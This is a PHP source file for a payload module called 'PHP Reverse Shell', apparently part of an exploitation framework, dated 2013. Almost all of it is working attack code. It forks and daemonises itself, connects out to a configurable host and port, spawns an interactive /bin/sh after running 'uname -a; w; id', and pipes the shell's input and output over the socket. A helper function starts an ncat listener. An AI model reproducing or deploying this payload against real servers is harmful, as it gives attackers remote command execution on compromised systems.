<?php
         
         
/*
PHP Reverse Shell
Version: 1.0
Author: Logic
Date:  08 May 2013
*/
 
 
namespace payload;
use \Framework as Framework;
     
class php_reverse extends Framework {
     
    protected $framework, $name, $description, $variables, $cookie;

    public function __construct($framework)
    {
       
            $this->framework = $framework;
            $this->name = 'PHP Reverse Shell';
            $this->description = 'Creates a Reverse shell back to the attacker';
            $this->modName = 'php_reverse';
            $this->variables = array(
            'port' => array('required' => true, 'description' => 'Specify Listening Port', 'default' => '31337'),
        );
       
    }
    
    public function getName()
    {
        return $this->name;
    }
    public function getVars()
    {
    return $this->variables;
    }
    public function getDesc()
    {
        return $this->description;
    }
    public function getMod()
    {
        return $this->modName;
    }
    private function loadModule()
    {
        $this->setModule(1, $this->module_name);
    }

    private function installModule()
    {
        $this->addModule($this->module_name);
        $this->loadModule();
    }

    public function check()
    {
        print "This module does not support check\n";
        return 1;
     }

    public function exploit()
    {
        // $this->ncat();
        // sleep(4);
        $this->run();
        return 1;
    }

    public function post()
    {
        print "This module does not support post Exploit\n";
        return 0;
    }


    public function run()
    {
        set_time_limit (0);
        $VERSION = "1.0";      
        $chunk_size = 1400;
        $write_a = null;
        $error_a = null;
        $shell = 'uname -a; w; id; /bin/sh -i';
        $daemon = 0;
        $debug = 0;

        if (function_exists('pcntl_fork')) {

            $pid = pcntl_fork();
            if ($pid == -1) {
                print("ERROR: Can't fork");
                exit(1);
            }

            if ($pid) {
                exit(0);  
            }
            if (posix_setsid() == -1) {
                print("Error: Can't setsid()");
                exit(1);
            }

            $daemon = 1;
        }
        else {
             print("WARNING: Failed to daemonise.  This is quite common and not fatal.");
        }
        chdir("/");
        umask(0);

        $sock = fsockopen($this->target, $this->port, $errno, $errstr, 30);

        if (!$sock) {
            print("$errstr ($errno)");
            exit(1);
        }

        $descriptorspec = array(
            0 => array("pipe", "r"),
             1 => array("pipe", "w"),  
            2 => array("pipe", "w")  
        );

        $process = proc_open($shell, $descriptorspec, $pipes);

        if (!is_resource($process)) {
            print("ERROR: Can't spawn shell");
            exit(1);
        }

        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        stream_set_blocking($sock, 0);

        print("Successfully opened reverse shell to ".$this->target.":".$this->port."\n\n");

        while (1) {

            if (feof($sock)) {
                print("ERROR: Shell connection terminated");
                break;
            }
            if (feof($pipes[1])) {
                print("ERROR: Shell process terminated");
                break;
            }
            $read_a = array($sock, $pipes[1], $pipes[2]);
            $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

            if (in_array($sock, $read_a)) {
                if ($debug) print("SOCK READ");
                    $input = fread($sock, $chunk_size);
                if ($debug) print("SOCK: $input");
                    fwrite($pipes[0], $input);
            }


            if (in_array($pipes[1], $read_a)) {
                if ($debug) print("STDOUT READ");
                    $input = fread($pipes[1], $chunk_size);
                if ($debug) print("STDOUT: $input");
                    fwrite($sock, $input);
            }


            if (in_array($pipes[2], $read_a)) {
                if ($debug) print("STDERR READ");
                    $input = fread($pipes[2], $chunk_size);
                if ($debug) print("STDERR: $input");
                    fwrite($sock, $input);
            }
        }

        fclose($sock);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        
        return 0;
    }

    public function ncat()
    {
        $descriptorspec = array(
        0 => array("pty"),
        1 => array("pty"),
        2 => array("pty")
         );

        $ncat = "ncat -v -l -n -p ";
        $cmd = $ncat.$this->port;


        $process = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
        echo stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $return_value = proc_close($process);

        echo "command returned $return_value\n";
        }
    }
}  

         
        ?>


